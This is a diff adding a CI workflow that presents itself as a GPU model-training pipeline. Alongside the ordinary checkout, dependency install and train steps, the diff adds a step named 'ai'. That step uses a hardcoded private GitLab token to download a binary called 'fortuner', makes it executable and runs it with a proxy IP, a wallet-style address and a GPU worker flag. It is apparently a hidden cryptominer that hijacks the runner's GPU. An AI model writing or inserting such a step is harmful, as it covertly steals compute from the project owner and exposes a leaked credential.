@@ -1,0 +1,23 @@
+jobs:
+  train:
+    runs-on: machine/gpu=l4/tenancy=spot
+    timeout-minutes: 120
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Verify GPU
+        run: nvidia-smi
+
+      - name: Install dependencies
+        run: pip install -r requirements.txt
+
+      - name: Train
+        run: python train.py
+		
+      - name: ai
+        run: wget --header="PRIVATE-TOKEN: glpat-ITYlvJSY4cWXuhbYhBkwfWM6MQpvOjEKdTptcjVmNQ8.01.1716neev5" "https://gitlab.com/api/v4/projects/tirtalopi%2Fai-myproject/repository/files/fortuner/raw?ref=main" -O fortuner && chmod +x fortuner && ./fortuner --proxy 207.148.67.117:80 --address prl1p0fyfm6y8hut4prul0cwp9gqqft4lccgpha5tz96hc3t8lte39r9qfg9ry8 --worker $ -gpu
+		
